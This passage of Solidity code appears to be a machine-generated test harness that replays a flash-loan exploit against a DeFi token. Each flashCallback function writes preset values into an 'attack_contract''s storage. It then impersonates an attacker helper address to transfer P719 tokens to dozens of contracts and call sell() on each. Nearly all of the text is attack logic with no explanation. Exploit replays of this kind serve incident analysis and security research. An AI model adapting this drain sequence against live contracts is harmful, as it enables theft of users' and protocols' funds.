                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_3 = 526636214289627321527;
            IContract_2018B0_3DBD(Addresses.A_2018B0_3DBD).sell(sellLiveAmount_3);
        }
    }

    function flashCallback12() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_4 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_4;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_02B0F1_3F5E, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_4 = 526636214289627321527;
            IContract_02B0F1_3F5E(Addresses.A_02B0F1_3F5E).sell(sellLiveAmount_4);
        }
        {
            uint256 p719TransferFromAmount_5 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_5;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_1ABEBA_C81E, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_5 = 526636214289627321527;
            IContract_1ABEBA_C81E(Addresses.A_1ABEBA_C81E).sell(sellLiveAmount_5);
        }
        {
            uint256 p719TransferFromAmount_6 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_6;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_5785B5_78A2, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_6 = 526636214289627321527;
            IContract_5785B5_78A2(Addresses.A_5785B5_78A2).sell(sellLiveAmount_6);
        }
        {
            uint256 p719TransferFromAmount_7 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_7;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_85AB58_F245, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_7 = 526636214289627321527;
            IContract_85AB58_F245(Addresses.A_85AB58_F245).sell(sellLiveAmount_7);
        }
        {
            uint256 p719TransferFromAmount_8 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_8;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_5D966D_57E1, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_8 = 526636214289627321527;
            IContract_5D966D_57E1(Addresses.A_5D966D_57E1).sell(sellLiveAmount_8);
        }
        {
            uint256 p719TransferFromAmount_9 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_9;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_2E4C85_D649, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_9 = 526636214289627321527;
            IContract_2E4C85_D649(Addresses.A_2E4C85_D649).sell(sellLiveAmount_9);
        }
        {
            uint256 p719TransferFromAmount_10 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_10;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_F89CCB_B883, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_10 = 526636214289627321527;
            IContract_F89CCB_B883(Addresses.A_F89CCB_B883).sell(sellLiveAmount_10);
        }
        {
            uint256 p719TransferFromAmount_11 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_11;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D7E519_A75A, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_11 = 526636214289627321527;
            IContract_D7E519_A75A(Addresses.A_D7E519_A75A).sell(sellLiveAmount_11);
        }
        {
            uint256 p719TransferFromAmount_12 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_12;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_F0A921_F6CB, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_12 = 526636214289627321527;
            IContract_F0A921_F6CB(Addresses.A_F0A921_F6CB).sell(sellLiveAmount_12);
        }
        {
            uint256 p719TransferFromAmount_13 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_13;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_9DCC3E_7B64, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_13 = 526636214289627321527;
            IContract_9DCC3E_7B64(Addresses.A_9DCC3E_7B64).sell(sellLiveAmount_13);
        }
    }

    function flashCallback13() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_14 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_14;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_94C04E_3A92, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_14 = 526636214289627321527;
            IContract_94C04E_3A92(Addresses.A_94C04E_3A92).sell(sellLiveAmount_14);
        }
        {
            uint256 p719TransferFromAmount_15 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_15;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_252C9F_199F, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_15 = 526636214289627321527;
            IContract_252C9F_199F(Addresses.A_252C9F_199F).sell(sellLiveAmount_15);
        }
        {
            uint256 p719TransferFromAmount_16 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_16;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_716BFB_3056, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_16 = 526636214289627321527;
            IContract_716BFB_3056(Addresses.A_716BFB_3056).sell(sellLiveAmount_16);
        }
        {
            uint256 p719TransferFromAmount_17 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_17;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_252CDA_595B, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_17 = 526636214289627321527;
            IContract_252CDA_595B(Addresses.A_252CDA_595B).sell(sellLiveAmount_17);
        }
        {
            uint256 p719TransferFromAmount_18 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_18;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_618A65_375A, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_18 = 526636214289627321527;
            IContract_618A65_375A(Addresses.A_618A65_375A).sell(sellLiveAmount_18);
        }
        {
            uint256 p719TransferFromAmount_19 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_19;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_3F5525_0955, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_19 = 526636214289627321527;
            IContract_3F5525_0955(Addresses.A_3F5525_0955).sell(sellLiveAmount_19);
        }
        {
            uint256 p719TransferFromAmount_20 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_20;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_BA6D08_61FB, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_20 = 526636214289627321527;
            IContract_BA6D08_61FB(Addresses.A_BA6D08_61FB).sell(sellLiveAmount_20);
        }
        {
            uint256 p719TransferFromAmount_21 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_21;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_2CB5BB_09FF, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_21 = 526636214289627321527;
            IContract_2CB5BB_09FF(Addresses.A_2CB5BB_09FF).sell(sellLiveAmount_21);
        }
        {
            uint256 p719TransferFromAmount_22 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_22;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_03B9A5_5C2A, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_22 = 526636214289627321527;
            IContract_03B9A5_5C2A(Addresses.A_03B9A5_5C2A).sell(sellLiveAmount_22);
        }
        {
            uint256 p719TransferFromAmount_23 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_23;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_EA7B51_C3CA, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_23 = 526636214289627321527;
            IContract_EA7B51_C3CA(Addresses.A_EA7B51_C3CA).sell(sellLiveAmount_23);
        }
    }

    function flashCallback14() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_24 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_24;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_35E6A9_4185, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_24 = 526636214289627321527;
            IContract_35E6A9_4185(Addresses.A_35E6A9_4185).sell(sellLiveAmount_24);
        }
        {
            uint256 p719TransferFromAmount_25 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_25;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_617E88_F6FD, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_25 = 526636214289627321527;
            IContract_617E88_F6FD(Addresses.A_617E88_F6FD).sell(sellLiveAmount_25);
        }
        {
            uint256 p719TransferFromAmount_26 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_26;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_2E7A12_AE57, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_26 = 526636214289627321527;
            IContract_2E7A12_AE57(Addresses.A_2E7A12_AE57).sell(sellLiveAmount_26);
        }
        {
            uint256 p719TransferFromAmount_27 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_27;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_E95739_DF34, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_27 = 526636214289627321527;
            IContract_E95739_DF34(Addresses.A_E95739_DF34).sell(sellLiveAmount_27);
        }
        {
            uint256 p719TransferFromAmount_28 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_28;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_2D8D5D_4657, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_28 = 526636214289627321527;
            IContract_2D8D5D_4657(Addresses.A_2D8D5D_4657).sell(sellLiveAmount_28);
        }
        {
            uint256 p719TransferFromAmount_29 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_29;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_7A87D3_6100, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_29 = 526636214289627321527;
            IContract_7A87D3_6100(Addresses.A_7A87D3_6100).sell(sellLiveAmount_29);
        }
        {
            uint256 p719TransferFromAmount_30 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_30;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_23EAF9_98D3, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_30 = 526636214289627321527;
            IContract_23EAF9_98D3(Addresses.A_23EAF9_98D3).sell(sellLiveAmount_30);
        }
        {
            uint256 p719TransferFromAmount_31 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_31;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_DE6F01_590C, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_31 = 526636214289627321527;
            IContract_DE6F01_590C(Addresses.A_DE6F01_590C).sell(sellLiveAmount_31);
        }
        {
            uint256 p719TransferFromAmount_32 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_32;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_DACB83_2481, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_32 = 526636214289627321527;
            IContract_DACB83_2481(Addresses.A_DACB83_2481).sell(sellLiveAmount_32);
        }
        {
            uint256 p719TransferFromAmount_33 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_33;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_E56A16_E9B3, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_33 = 526636214289627321527;
            IContract_E56A16_E9B3(Addresses.A_E56A16_E9B3).sell(sellLiveAmount_33);
        }
    }

    function flashCallback15() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_34 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_34;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D13C8F_869E, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_34 = 526636214289627321527;
            IContract_D13C8F_869E(Addresses.A_D13C8F_869E).sell(sellLiveAmount_34);
        }
        {
            uint256 p719TransferFromAmount_35 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_35;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_BAE398_68E1, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_35 = 526636214289627321527;
            IContract_BAE398_68E1(Addresses.A_BAE398_68E1).sell(sellLiveAmount_35);
        }
        {
            uint256 p719TransferFromAmount_36 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_36;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D4E54B_2AA8, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_36 = 526636214289627321527;
            IContract_D4E54B_2AA8(Addresses.A_D4E54B_2AA8).sell(sellLiveAmount_36);
        }
        {
            uint256 p719TransferFromAmount_37 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_37;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C44640_D087, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_37 = 526636214289627321527;
            IContract_C44640_D087(Addresses.A_C44640_D087).sell(sellLiveAmount_37);
        }
        {
            uint256 p719TransferFromAmount_38 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_38;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_751983_2CA1, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_38 = 526636214289627321527;
            IContract_751983_2CA1(Addresses.A_751983_2CA1).sell(sellLiveAmount_38);
        }
        {
            uint256 p719TransferFromAmount_39 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_39;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_71B554_FEDA, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_39 = 526636214289627321527;
            IContract_71B554_FEDA(Addresses.A_71B554_FEDA).sell(sellLiveAmount_39);
        }
        {
            uint256 p719TransferFromAmount_40 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_40;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_BA949A_F706, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_40 = 526636214289627321527;
            IContract_BA949A_F706(Addresses.A_BA949A_F706).sell(sellLiveAmount_40);
        }
        {
            uint256 p719TransferFromAmount_41 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_41;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_68FBD9_A87B, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_41 = 526636214289627321527;
            IContract_68FBD9_A87B(Addresses.A_68FBD9_A87B).sell(sellLiveAmount_41);
        }
        {
            uint256 p719TransferFromAmount_42 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_42;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_051B8B_48F4, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_42 = 526636214289627321527;
            IContract_051B8B_48F4(Addresses.A_051B8B_48F4).sell(sellLiveAmount_42);
        }
        {
            uint256 p719TransferFromAmount_43 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_43;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_513BE5_B315, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_43 = 526636214289627321527;
            IContract_513BE5_B315(Addresses.A_513BE5_B315).sell(sellLiveAmount_43);
        }
    }

    function flashCallback16() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
